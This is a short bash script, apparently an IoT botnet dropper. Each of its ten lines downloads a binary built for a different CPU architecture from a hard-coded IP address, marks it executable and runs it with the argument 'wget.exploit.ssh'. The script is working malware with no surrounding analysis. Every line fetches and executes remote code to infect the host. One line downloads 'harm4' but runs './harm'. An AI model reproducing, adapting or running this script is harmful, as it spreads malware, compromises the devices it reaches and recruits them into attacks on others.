#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hx86;  chmod +x *;./hx86 wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hmips; chmod +x *;./hmips wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hmpsl; chmod +x *;./hmpsl wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/harm4; chmod +x *;./harm wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/harm5; chmod +x *;./harm5 wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/harm6; chmod +x *;./harm6 wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/harm7; chmod +x *;./harm7 wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hppc; chmod +x *;./hppc wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hm68k; chmod +x *;./hm68k wget.exploit.ssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.105.4.242/wrgjwrgjwrg246356356356/hsh4; chmod +x *;./hsh4 wget.exploit.ssh
